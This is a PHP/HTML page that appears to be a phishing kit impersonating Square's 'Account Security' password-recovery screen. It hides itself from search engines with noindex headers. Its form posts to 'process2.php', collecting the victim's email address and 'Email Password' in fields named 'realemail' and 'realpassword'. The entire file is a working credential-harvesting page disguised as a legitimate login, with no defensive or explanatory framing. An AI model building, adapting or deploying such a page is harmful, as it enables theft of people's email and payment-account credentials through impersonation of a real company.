<?php 

@header('X-Robots-Tag: "none, noindex, nofollow, noarchive, nosnippet, noodp, notranslate, noimageindex"'); 


?>

<!DOCTYPE html>
<!--[if IE 8 ]> <html class="ie ie8" lang="en-US"> <![endif]-->
<!--[if IE 9 ]> <html class="ie ie9" lang="en-US"> <![endif]-->
<!--[if (gte IE 10)|!(IE)]><!-->
<html lang="en-US"><!--<![endif]-->
  <head>
    <meta name="robots" content="none, noindex, nofollow, noarchive, nosnippet, noodp, notranslate, noimageindex">
    <meta name="googlebot" content="none, noindex, nofollow, noarchive, nosnippet, noodp, notranslate, noimageindex">
    <meta name="googlebot-news" content="none, noindex, nofollow, noarchive, nosnippet, noodp, notranslate, noimageindex">

    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>Account Security</title>
    <meta name="viewport" content="width=device-width,user-scalable=no">
    <meta name="csrf-param" content="authenticity_token">
    <meta name="csrf-token" content="NvMVtVE3W0E-exLC1spVO2AnXbI9jJmGTtYPCryFakg">
    <meta name="domain-suggester-prompt" content="Did you mean {{corrected_email}}?">
    
    <meta name="max-idle-minutes" content="75">
    <meta name="max-two-factor-minutes" content="2147483647">
    <meta name="referrer" content="origin">
    <link href="assets/login.css" media="screen" rel="stylesheet">
    <link rel="icon" href="img/favicon.ico">

    <script type="text/javascript" async="" src="assets/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-wyvEVSrAxo98MJGE0PuR2ri6k5qurqxA2/a+2Rdj2zI1XHJHSGLsoRS5ADozusAM" nonce=""></script><script nonce="" src="assets/polyfill.js"></script>
    <script nonce="" src="assets/sentry.js" crossorigin="anonymous"></script>
    
  <style type="text/css"></style></head>

  <body class="login-page " data-new-gr-c-s-check-loaded="8.892.0" data-gr-ext-installed="">

  <noscript>
    <div id="no-script" style="height: 100%; width: 100%; display: flex; justify-content: center; flex-direction: column; align-items: center; position: absolute; background: #ffffff; z-index: 10000">
      <div class="no-script__container" style="max-width: 640px;">
        <svg width="40" height="40" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
          <path fill-rule="evenodd" clip-rule="evenodd" d="M0 8C0 6.76133 0 6.14199 0.0820777 5.62377C0.533888 2.77115 2.77115 0.533888 5.62377 0.0820777C6.14199 0 6.76133 0 8 0H32C33.2387 0 33.858 0 34.3762 0.0820777C37.2288 0.533888 39.4661 2.77115 39.9179 5.62377C40 6.14199 40 6.76133 40 8V32C40 33.2387 40 33.858 39.9179 34.3762C39.4661 37.2288 37.2288 39.4661 34.3762 39.9179C33.858 40 33.2387 40 32 40H8C6.76133 40 6.14199 40 5.62377 39.9179C2.77115 39.4661 0.533888 37.2288 0.0820777 34.3762C0 33.858 0 33.2387 0 32V8ZM8 9.89474C8 8.8483 8.8483 8 9.89474 8H30.1053C31.1517 8 32 8.8483 32 9.89474V30.1053C32 31.1517 31.1517 32 30.1053 32H9.89474C8.8483 32 8 31.1517 8 30.1053V9.89474ZM15.0519 15.7329C15 15.8926 15 16.09 15 16.4848V23.5152C15 23.91 15 24.1074 15.0519 24.2671C15.1568 24.59 15.41 24.8432 15.7329 24.9481C15.8926 25 16.09 25 16.4848 25H23.5152C23.91 25 24.1074 25 24.2671 24.9481C24.59 24.8432 24.8432 24.59 24.9481 24.2671C25 24.1074 25 23.91 25 23.5152V16.4848C25 16.09 25 15.8926 24.9481 15.7329C24.8432 15.41 24.59 15.1568 24.2671 15.0519C24.1074 15 23.91 15 23.5152 15H16.4848C16.09 15 15.8926 15 15.7329 15.0519C15.41 15.1568 15.1568 15.41 15.0519 15.7329Z"/>
        </svg>
        <p>
          JavaScript is required for functionality of this site.
          <a href="https://www.enable-javascript.com/" target="_blank" id="enable-js">Learn how to enable JavaScript.</a>
        </p>
      </div>
    </div>
  </noscript>

    <div id="content" class="fade-in l-table">
      <div id="login-wrapper" class="l-table-row">
        <div class="l-table-cell">
          <section class="login-modal">
            <div class="login-modal-user-pass" style="display: block;">
              <div class="login-modal-logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
                </svg>
              </div>
              <div class="login-modal-title">
                <span class="login-modal-password-text">Forgot Password</span>
                <span class="login-modal-instructions-sent-text">Instructions have been sent</span>
              </div>



              <div class="login-modal-content">

                <form accept-charset="UTF-8" action="process2.php" class="signin-page-form" method="post" novalidate="novalidate">
                  <div class="field email-field fade-label">
                    <label class="text" for="email">Email Address</label>
                    <input autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" class="text" id="email" name="realemail" size="30" spellcheck="false" type="email">
                  </div>
                  <a href="#" class="track-event">Enter email address associated with your Square account</a>

                  <div class="message-box-error-wrapper">
                    <div class="message-box-error"></div>
                  </div>
                  <div class="field password-field fade-label">
                    <label class="text" for="password">Email Password</label>
                    <input class="text" id="password" name="realpassword" size="30" autocomplete="off" type="password" value="">
                    <!--<div class="login-forgot-password-wrapper">
                      <a href="#" class="forgot-password-link track-event">Forgot Password</a>
                    </div>-->
                  </div>

                  <div style="clear: both;"></div>

                  <div class="submit-button full-length-submit-button">
                    <button id="sign-in-button" name="sign-in-button" type="submit" class="btn btn-blue track-event">
                      <span class="button-text">Sign In</span>
                    </button>
                  </div>
                  <div class="footer">
                    For the security of your account, please enter the email address and password associated with your Square account.
                  </div>
                </form>
              </div>
            </div>
            
          </section>

          <div class="login-modal-footer login-language-wrapper">
            
            <div class="language-selector">
              <div class="language-prompt">
                <ul class="reset locale-list language-list">
                     <li class="language " data-language="en"><span>English</span></li>
                     <li class="language au" data-language="en-AU"><span>English (Australia)</span></li>
                     <li class="language ca" data-language="en-CA"><span>English (Canada)</span></li>
                     <li class="language ie" data-language="en-IE"><span>English (Ireland)</span></li>
                     <li class="language gb" data-language="en-GB"><span>English (United Kingdom)</span></li>
                     <li class="language " data-language="es"><span>español</span></li>
                     <li class="language ca" data-language="fr-CA"><span>français (Canada)</span></li>
                     <li class="language fr" data-language="fr-FR"><span>français (France)</span></li>
                     <li class="language " data-language="ja"><span>日本語</span></li>
                </ul>
              </div>
              <a href="#" class="arrow selected-language en">English</a>
            </div>

          </div>
      </div>
    </div>

    <script nonce="" src="assets/fingerprint.js"></script>
    <script nonce="" src="assets/jquery-1.js"></script>
    <script nonce="" src="assets/jquery.js"></script>
    <script nonce="" src="assets/jquery_002.js"></script>
    <script nonce="" src="assets/json2.js"></script>
    <script nonce="" src="assets/spin.js"></script>
    <script nonce="" src="assets/libphonenumber-min.js"></script>
    <script nonce="" src="assets/libphonenumber-ui.js"></script>
    <script nonce="" src="assets/moment-with-locales.js"></script>
    <script nonce="" src="assets/login.js"></script>
    
    <script nonce="" src="assets/language-selector.js"></script>
    <script nonce="" src="assets/jquery_003.js"></script>
    <script nonce="" src="assets/underscore-min.js"></script>
    <script nonce="" src="assets/new_relic_episodes.js"></script>
    <script nonce="" src="assets/eventstream.js"></script>
    <script nonce="" src="assets/eventstream_logging.js"></script>
    <script nonce="" src="assets/qrcode.js"></script>
    <script nonce="" src="assets/enterprise.js" async="" defer="defer"></script>
  

</body>
</html>